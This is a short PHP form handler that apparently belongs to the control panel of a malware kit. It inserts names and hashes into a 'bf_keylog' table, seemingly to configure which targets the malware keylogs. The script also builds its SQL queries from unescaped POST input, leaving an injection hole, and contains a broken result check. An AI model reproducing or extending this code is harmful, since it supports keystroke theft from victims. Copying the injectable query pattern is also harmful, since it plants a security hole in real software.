<?php
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
get_function('real_escape_string');
if(isset($_POST['submit'])){	@array_walk($_POST, 'real_escape_string');

	if(empty($_POST['name'])){
		$bad_form['name'] = $lang['knbp'];
		$FORM_BAD = 1;
	}

	if(empty($_POST['hash'])){
		$bad_form['hash'] = $lang['xnmbp'];
		$FORM_BAD = 1;
	}else{
        $result = $mysqli->query("SELECT hash FROM bf_keylog WHERE (hash='".$_POST['hash']."')");
        if($result->hash == $_POST['hash']){
        	$bad_form['hash'] = $lang['vxyes'];
        	$FORM_BAD = 1;
        }
	}

	if($FORM_BAD <> 1){
		if($mysqli->query("INSERT INTO bf_keylog (name, hash, post_id) VALUES ('".$_POST['name']."', '".$_POST['hash']."', '".$_SESSION['user']->id."')") == false){
			$errors .= '<div class="t"><div class="t4" align="center">'.$lang['dzsnp'].'</div></div>';
		}else{
			$smarty->assign("save", true);
		}
	}else{
		if(count($bad_form) > 0){
			rsort($bad_form);
			for($i = 0; $i < count($bad_form); $i++){
				if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
				$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
			}
		}
	}
	$smarty->assign("errors", $errors);
}
?>